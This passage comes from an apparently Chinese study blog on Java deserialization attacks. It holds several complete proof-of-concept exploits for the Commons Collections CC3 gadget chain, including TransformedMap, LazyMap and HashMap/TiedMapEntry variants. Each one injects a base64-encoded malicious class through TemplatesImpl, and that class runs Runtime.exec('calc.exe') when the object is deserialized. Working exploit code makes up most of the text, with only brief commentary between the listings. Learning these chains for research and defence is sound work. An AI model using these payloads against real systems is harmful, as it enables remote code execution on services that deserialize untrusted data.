class="string">&quot;yv66vgAAADQALAoABgAeCgAfACAIACEKAB8AIgcAIwcAJAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAGTGV2aWw7AQAKRXhjZXB0aW9ucwcAJQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsHACYBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAClNvdXJjZUZpbGUBAAlldmlsLmphdmEMAAcACAcAJwwAKAApAQAIY2FsYy5leGUMACoAKwEABGV2aWwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQATamF2YS9pby9JT0V4Y2VwdGlvbgEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAFAAYAAAAAAAMAAQAHAAgAAgAJAAAAQAACAAEAAAAOKrcAAbgAAhIDtgAEV7EAAAACAAoAAAAOAAMAAAAKAAQACwANAAwACwAAAAwAAQAAAA4ADAANAAAADgAAAAQAAQAPAAEAEAARAAIACQAAAD8AAAADAAAAAbEAAAACAAoAAAAGAAEAAAAQAAsAAAAgAAMAAAABAAwADQAAAAAAAQASABMAAQAAAAEAFAAVAAIADgAAAAQAAQAWAAEAEAAXAAIACQAAAEkAAAAEAAAAAbEAAAACAAoAAAAGAAEAAAATAAsAAAAqAAQAAAABAAwADQAAAAAAAQASABMAAQAAAAEAGAAZAAIAAAABABoAGwADAA4AAAAEAAEAFgABABwAAAACAB0=&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">Impl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setValue(Impl,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;b1uel0n3&quot;</span>);</span><br><span class="line">        setValue(Impl,<span class="string">&quot;_class&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">        setValue(Impl,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytes&#125;);</span><br><span class="line">        setValue(Impl,<span class="string">&quot;_tfactory&quot;</span>,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        ConstantTransformer Im=<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Impl);</span><br><span class="line">        InvokerTransformer newTransformer=<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>,<span class="literal">null</span>,<span class="literal">null</span>);</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;Im,newTransformer&#125;;</span><br><span class="line">        ChainedTransformer chaind=<span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object,Object&gt; hashMap=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        Map&lt;Object,Object&gt; transformedMap= TransformedMap.decorate(hashMap,<span class="literal">null</span>, chaind);</span><br><span class="line">        hashMap.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;b1uel0n3&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Class&lt;?&gt; cls= Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        Constructor&lt;?&gt; constructor = cls.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        Object o=constructor.newInstance(Retention.class,transformedMap);</span><br><span class="line"></span><br><span class="line">        serialize(o);</span><br><span class="line">        unserialize();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object o)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        FileOutputStream out=<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;E:\\study\\web\\java\\test.ser&quot;</span>);</span><br><span class="line">        ObjectOutputStream oos=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(out);</span><br><span class="line">        oos.writeObject(o);</span><br><span class="line">        oos.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        FileInputStream in=<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;E:\\study\\web\\java\\test.ser&quot;</span>);</span><br><span class="line">        ObjectInputStream ois=<span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(in);</span><br><span class="line">        ois.readObject();</span><br><span class="line">        in.close();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Object obj, String filedname, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">           Field field=obj.getClass().getDeclaredField(filedname);</span><br><span class="line">           field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">           field.set(obj,value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/archives/36318858/image-20250629225056043-175245726416314.png" alt="image-20250629225056043"></p><p>CC1的LazyMap链一样的，只用修改后半部分。</p><p>CC3（LazyMap）完整poc：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC3</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] bytes = Base64.getDecoder().decode(<span class="string">&quot;yv66vgAAADQALAoABgAeCgAfACAIACEKAB8AIgcAIwcAJAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAGTGV2aWw7AQAKRXhjZXB0aW9ucwcAJQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsHACYBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAClNvdXJjZUZpbGUBAAlldmlsLmphdmEMAAcACAcAJwwAKAApAQAIY2FsYy5leGUMACoAKwEABGV2aWwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQATamF2YS9pby9JT0V4Y2VwdGlvbgEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAFAAYAAAAAAAMAAQAHAAgAAgAJAAAAQAACAAEAAAAOKrcAAbgAAhIDtgAEV7EAAAACAAoAAAAOAAMAAAAKAAQACwANAAwACwAAAAwAAQAAAA4ADAANAAAADgAAAAQAAQAPAAEAEAARAAIACQAAAD8AAAADAAAAAbEAAAACAAoAAAAGAAEAAAAQAAsAAAAgAAMAAAABAAwADQAAAAAAAQASABMAAQAAAAEAFAAVAAIADgAAAAQAAQAWAAEAEAAXAAIACQAAAEkAAAAEAAAAAbEAAAACAAoAAAAGAAEAAAATAAsAAAAqAAQAAAABAAwADQAAAAAAAQASABMAAQAAAAEAGAAZAAIAAAABABoAGwADAA4AAAAEAAEAFgABABwAAAACAB0=&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">Impl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setValue(Impl,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;b1uel0n3&quot;</span>);</span><br><span class="line">        setValue(Impl,<span class="string">&quot;_class&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">        setValue(Impl,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytes&#125;);</span><br><span class="line">        setValue(Impl,<span class="string">&quot;_tfactory&quot;</span>,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        ConstantTransformer Im=<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Impl);</span><br><span class="line">        InvokerTransformer newTransformer=<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>,<span class="literal">null</span>,<span class="literal">null</span>);</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;Im,newTransformer&#125;;</span><br><span class="line">        ChainedTransformer chaind=<span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        HashMap hashMap=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        Map Lazymap= LazyMap.decorate(hashMap, chaind);</span><br><span class="line">        hashMap.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;b1uel0n3&quot;</span>);  <span class="comment">//可不需要，因为不用去触发memberValues.getValue()方法</span></span><br><span class="line"></span><br><span class="line">        Class&lt;?&gt; cls= Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        Constructor&lt;?&gt; constructor = cls.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        InvocationHandler handler= (InvocationHandler)constructor.newInstance(Retention.class, Lazymap);</span><br><span class="line">        Map proxy= (Map) Proxy.newProxyInstance(Map.class.getClassLoader(),<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;,handler);</span><br><span class="line">        Object o=constructor.newInstance(Retention.class,proxy);</span><br><span class="line"></span><br><span class="line">        serialize(o);</span><br><span class="line">        unserialize();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object o)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        FileOutputStream out=<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;E:\\study\\web\\java\\test.ser&quot;</span>);</span><br><span class="line">        ObjectOutputStream oos=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(out);</span><br><span class="line">        oos.writeObject(o);</span><br><span class="line">        oos.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        FileInputStream in=<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;E:\\study\\web\\java\\test.ser&quot;</span>);</span><br><span class="line">        ObjectInputStream ois=<span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(in);</span><br><span class="line">        ois.readObject();</span><br><span class="line">        in.close();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Object obj, String filedname, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">           Field field=obj.getClass().getDeclaredField(filedname);</span><br><span class="line">           field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">           field.set(obj,value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/archives/36318858/image-20250629225832604-175245726416315.png" alt="image-20250629225832604"></p><h4 id="CC6环境下"><a href="#CC6环境下" class="headerlink" title="CC6环境下"></a>CC6环境下</h4><p>如果jdk版本在8u71以上，那么我们就可以利用CC6+TemplatesImpl加载字节码来构造poc</p><p>原理也是一样的，因为CC1和CC6后半部分的调用都是一样的</p><p>CC3（HashMap）完整poc:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC3</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] bytes = Base64.getDecoder().decode(<span class="string">&quot;yv66vgAAADQALAoABgAeCgAfACAIACEKAB8AIgcAIwcAJAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAGTGV2aWw7AQAKRXhjZXB0aW9ucwcAJQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsHACYBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAClNvdXJjZUZpbGUBAAlldmlsLmphdmEMAAcACAcAJwwAKAApAQAIY2FsYy5leGUMACoAKwEABGV2aWwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQATamF2YS9pby9JT0V4Y2VwdGlvbgEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAFAAYAAAAAAAMAAQAHAAgAAgAJAAAAQAACAAEAAAAOKrcAAbgAAhIDtgAEV7EAAAACAAoAAAAOAAMAAAAKAAQACwANAAwACwAAAAwAAQAAAA4ADAANAAAADgAAAAQAAQAPAAEAEAARAAIACQAAAD8AAAADAAAAAbEAAAACAAoAAAAGAAEAAAAQAAsAAAAgAAMAAAABAAwADQAAAAAAAQASABMAAQAAAAEAFAAVAAIADgAAAAQAAQAWAAEAEAAXAAIACQAAAEkAAAAEAAAAAbEAAAACAAoAAAAGAAEAAAATAAsAAAAqAAQAAAABAAwADQAAAAAAAQASABMAAQAAAAEAGAAZAAIAAAABABoAGwADAA4AAAAEAAEAFgABABwAAAACAB0=&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">Impl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setValue(Impl,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;b1uel0n3&quot;</span>);</span><br><span class="line">        setValue(Impl,<span class="string">&quot;_class&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">        setValue(Impl,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytes&#125;);</span><br><span class="line">        setValue(Impl,<span class="string">&quot;_tfactory&quot;</span>,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        </span><br><span class="line">        Transformer[] faketransformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;;</span><br><span class="line"></span><br><span class="line">        ConstantTransformer Im=<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Impl);</span><br><span class="line">        InvokerTransformer newTransformer=<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>,<span class="literal">null</span>,<span class="literal">null</span>);</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;Im,newTransformer&#125;;</span><br><span class="line">        </span><br><span class="line">        ChainedTransformer chaind=<span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(faketransformers);</span><br><span class="line"></span><br><span class="line">        Map innermap=<span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        Map Lazymap=LazyMap.decorate(innermap, chaind);</span><br><span class="line">        TiedMapEntry tiedMapEntry=<span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(Lazymap,<span class="string">&quot;111&quot;</span>);</span><br><span class="line">        Map map=<span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        map.put(tiedMapEntry,<span class="string">&quot;b1uel0n3&quot;</span>);</span><br><span class="line">        innermap.remove(<span class="string">&quot;111&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Field field=chaind.getClass().getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(chaind,transformers);</span><br><span class="line"></span><br><span class="line">        serialize(map);</span><br><span class="line">        unserialize();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object o)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        FileOutputStream out=<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;E:\\study\\web\\java\\test.ser&quot;</span>);</span><br><span class="line">        ObjectOutputStream oos=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(out);</span><br><span class="line">        oos.writeObject(o);</span><br><span class="line">        oos.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        FileInputStream in=<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;E:\\study\\web\\java\\test.ser&quot;</span>);</span><br><span class="line">        ObjectInputStream ois=<span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(in);</span><br><span class="line">        ois.readObject();</span><br><span class="line">        in.close();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Object obj, String filedname, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">           Field field=obj.getClass().getDeclaredField(filedname);</span><br><span class="line">           field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">           field.set(obj,value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/archives/36318858/image-20250630220851738-175245726416316.png" alt="image-20250630220851738"></p><p>CC3（HashSet）完整poc：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span 